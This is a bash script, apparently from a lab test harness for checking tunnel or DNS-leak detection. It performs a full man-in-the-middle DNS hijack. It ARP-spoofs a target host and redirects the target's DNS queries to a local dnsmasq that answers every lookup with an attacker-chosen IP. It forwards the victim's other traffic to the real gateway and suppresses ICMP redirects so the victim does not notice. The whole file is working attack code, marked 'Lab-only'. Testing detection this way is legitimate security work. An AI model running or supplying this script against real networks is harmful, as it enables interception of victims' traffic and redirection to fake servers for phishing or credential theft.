#!/usr/bin/env bash
# Answer DNS on this host (dnsmasq) and redirect TARGET's port-53 traffic here via ARP spoofing,
# so lookups resolve to FAKE_IP instead of the real answer. Everything else of the victim is
# passed on to the real gateway, as a real man in the middle does (otherwise the victim's tunnel
# dies and the attack is no longer "DNS redirected" but "network down"). Lab-only.
# Usage: TARGET=<ip> FAKE_IP=<ip> [GW=<ip>] [DURATION=20] [FORWARD=1] ./dns-hijack.sh
#   FORWARD=0  old behaviour: pass nothing on (tests the check with a cut tunnel)
set -euo pipefail
. "$(dirname "$0")/common.sh"
need dnsmasq; need arpspoof; need nft; need_target
: "${FAKE_IP:?set FAKE_IP=<ip> to return for every lookup}"
[[ -n $GW ]] || { echo "no gateway found on $IFACE, set GW=<ip>" >&2; exit 2; }
FORWARD=${FORWARD:-1}
RT=4253 # own routing table: Kali's default route (NAT NIC, used for ssh) stays as it is
conf=$(mktemp)
old_fwd=$(sysctl -n net.ipv4.ip_forward 2>/dev/null || echo 0)
old_redir=$(sysctl -n "net.ipv4.conf.$IFACE.send_redirects" 2>/dev/null || echo 1)
old_redir_all=$(sysctl -n net.ipv4.conf.all.send_redirects 2>/dev/null || echo 1)
cleanup() {
	rm -f "$conf"
	sudo nft delete table ip shuntlab_dnshijack 2>/dev/null || true
	kill "${arp_pid:-0}" 2>/dev/null || true
	if [[ $FORWARD == 1 ]]; then
		sudo ip rule del iif "$IFACE" from "$TARGET" lookup "$RT" 2>/dev/null || true
		sudo ip route flush table "$RT" 2>/dev/null || true
		sudo sysctl -qw net.ipv4.ip_forward="$old_fwd" "net.ipv4.conf.$IFACE.send_redirects=$old_redir" \
			net.ipv4.conf.all.send_redirects="$old_redir_all" 2>/dev/null || true
	fi
}
trap cleanup EXIT
cat >"$conf" <<EOF
interface=$IFACE
bind-interfaces
port=53
no-resolv
no-hosts
address=/#/$FAKE_IP
EOF
# the victim's port-53 packets reach us addressed to the real resolver: redirect them to our dnsmasq
sudo nft add table ip shuntlab_dnshijack
sudo nft "add chain ip shuntlab_dnshijack pre { type nat hook prerouting priority dstnat; }"
sudo nft "add rule ip shuntlab_dnshijack pre iifname \"$IFACE\" ip saddr $TARGET udp dport 53 redirect to :53"
if [[ $FORWARD == 1 ]]; then
	# pass the rest on to the real gateway, out of the NIC it came in on; no ICMP redirects
	# (they would tell the victim the direct way)
	sudo sysctl -qw net.ipv4.ip_forward=1 "net.ipv4.conf.$IFACE.send_redirects=0" net.ipv4.conf.all.send_redirects=0
	sudo ip route replace default via "$GW" dev "$IFACE" table "$RT"
	sudo ip rule add iif "$IFACE" from "$TARGET" lookup "$RT"
	sudo nft "add chain ip shuntlab_dnshijack pass { type filter hook forward priority 0; }"
	sudo nft "add rule ip shuntlab_dnshijack pass iifname \"$IFACE\" oifname \"$IFACE\" ip saddr $TARGET counter accept"
	echo "passing the victim's other traffic on to $GW (FORWARD=1)"
fi
sudo arpspoof -i "$IFACE" -t "$TARGET" "$GW" >/dev/null 2>&1 &
arp_pid=$!
echo "fake DNS on $IFACE for ${DURATION}s, answering everything with $FAKE_IP"
sudo timeout "$DURATION" dnsmasq -k -C "$conf" --pid-file="$(mktemp -u)" || true
if [[ $FORWARD == 1 ]]; then
	echo "forwarded for the victim: $(sudo nft list chain ip shuntlab_dnshijack pass 2>/dev/null | grep -o 'packets [0-9]*' | head -1)"
fi
